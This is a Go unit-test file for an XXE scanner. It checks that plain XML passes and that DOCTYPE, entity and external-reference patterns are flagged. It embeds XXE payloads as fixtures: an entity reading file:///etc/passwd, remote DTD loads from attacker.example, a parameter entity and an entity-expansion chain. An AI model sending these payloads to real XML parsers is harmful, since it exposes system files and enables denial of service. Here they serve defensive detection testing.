package main

import (
	"strings"
	"testing"
)

func xxeHasReason(findings []XXEFinding, reason string) bool {
	for _, f := range findings {
		if f.Reason == reason {
			return true
		}
	}
	return false
}

func TestXXECleanPlainXML(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<root><item>hello</item><item>world</item></root>`)
	if !XXEIsSafe(doc) {
		t.Fatalf("plain XML should be safe, findings=%#v", XXEScan(doc, DefaultXXEPolicy()))
	}
}

func TestXXEInternalEntityBillionLaughs(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if !xxeHasReason(findings, XXEReasonDOCTYPEPresent) {
		t.Fatal("expected doctype finding")
	}
	if !xxeHasReason(findings, XXEReasonEntityDeclared) {
		t.Fatal("expected entity-declared finding")
	}
	if !xxeHasReason(findings, XXEReasonEntityExpansion) {
		t.Fatalf("expected expansion-chain finding, %#v", findings)
	}
	if XXEIsSafe(doc) {
		t.Fatal("billion-laughs doc must not be safe")
	}
}

func TestXXEExternalSystem(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if !xxeHasReason(findings, XXEReasonExternalSystem) {
		t.Fatal("expected SYSTEM finding")
	}
	if !xxeHasReason(findings, XXEReasonExternalURI) {
		t.Fatal("expected external URI finding")
	}
}

func TestXXEHTTPEntity(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY remote SYSTEM "http://attacker.example/evil.dtd">
]>
<data>&remote;</data>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if !xxeHasReason(findings, XXEReasonExternalSystem) {
		t.Fatal("expected SYSTEM")
	}
	if !xxeHasReason(findings, XXEReasonExternalURI) {
		t.Fatal("expected http URI")
	}
}

func TestXXEPublicIdentifier(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/xhtml1.dtd">
<html/>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if !xxeHasReason(findings, XXEReasonExternalPublic) {
		t.Fatal("expected PUBLIC finding")
	}
	if !xxeHasReason(findings, XXEReasonExternalURI) {
		t.Fatal("expected external URI in public id literal")
	}
}

func TestXXEParameterEntity(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.example/x.dtd">
  %ext;
]>
<root/>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if !xxeHasReason(findings, XXEReasonParameterEntity) {
		t.Fatalf("expected parameter entity finding, %#v", findings)
	}
}

func TestXXEKeywordInCommentIgnored(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!-- <!ENTITY x SYSTEM "http://x"> not real markup -->
<root>ok</root>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if xxeHasReason(findings, XXEReasonEntityDeclared) || xxeHasReason(findings, XXEReasonExternalSystem) {
		t.Fatalf("comment content must be ignored, %#v", findings)
	}
}

func TestXXEKeywordInCDATAIgnored(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<root><![CDATA[<!DOCTYPE x [<!ENTITY y SYSTEM "file:///z">]>]]></root>`)
	findings := XXEScan(doc, DefaultXXEPolicy())
	if xxeHasReason(findings, XXEReasonDOCTYPEPresent) || xxeHasReason(findings, XXEReasonEntityDeclared) {
		t.Fatalf("CDATA content must be ignored, %#v", findings)
	}
}

func TestXXECharReferenceNotExpansion(t *testing.T) {
	// 数字字符引用 &#65; / &#x41; 不构成实体链；但 DOCTYPE/ENTITY 仍按策略被拦，
	// 这里只验证在放开 DOCTYPE 的自定义策略下不会误报 expansion-chain。
	pol := DefaultXXEPolicy()
	pol.ForbidDOCTYPE = false
	pol.ForbidENTITY = false
	pol.ForbidExternalRef = false
	doc := []byte(`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY c "&#65;&#x41;">]><x>&c;</x>`)
	findings := XXEScan(doc, pol)
	if xxeHasReason(findings, XXEReasonEntityExpansion) {
		t.Fatalf("numeric char references are not entity expansion, %#v", findings)
	}
}

func TestXXEDocumentTooLarge(t *testing.T) {
	pol := DefaultXXEPolicy()
	pol.MaxDocumentBytes = 16
	doc := []byte("<root>this is a much longer document than the cap</root>")
	findings := XXEScan(doc, pol)
	if !xxeHasReason(findings, XXEReasonDocumentTooLarge) {
		t.Fatal("expected too-large finding")
	}
}

func TestXXECaseInsensitiveDoctype(t *testing.T) {
	for _, d := range []string{"<!DOCTYPE", "<!doctype", "<!DoCtYpE"} {
		doc := []byte(`<?xml version="1.0"?>` + d + ` x><x/>`)
		if !xxeHasReason(XXEScan(doc, DefaultXXEPolicy()), XXEReasonDOCTYPEPresent) {
			t.Fatalf("case variant %s not detected", d)
		}
	}
}

func TestXXESystemWordBoundary(t *testing.T) {
	// "SYSTEMX" 不应被当作 SYSTEM 关键字（但 DOCTYPE/ENTITY 仍会触发其他规则）。
	pol := DefaultXXEPolicy()
	doc := []byte(`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY SYSTEMX "v">]><x/>`)
	findings := XXEScan(doc, pol)
	if xxeHasReason(findings, XXEReasonExternalSystem) {
		t.Fatalf("SYSTEMX must not match SYSTEM, %#v", findings)
	}
}

func TestXXEDataURIScheme(t *testing.T) {
	doc := []byte(`<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY a SYSTEM "data:text/plain,hello">]><x>&a;</x>`)
	if !xxeHasReason(XXEScan(doc, DefaultXXEPolicy()), XXEReasonExternalURI) {
		t.Fatal("expected data: URI finding")
	}
}

func TestXXELargePlainDocNoDoctype(t *testing.T) {
	var sb strings.Builder
	sb.WriteString(`<?xml version="1.0"?><root>`)
	for i := 0; i < 1000; i++ {
		sb.WriteString(`<item>plain content without any dtd</item>`)
	}
	sb.WriteString(`</root>`)
	doc := []byte(sb.String())
	if !XXEIsSafe(doc) {
		t.Fatal("large but DTD-free XML should be safe")
	}
}
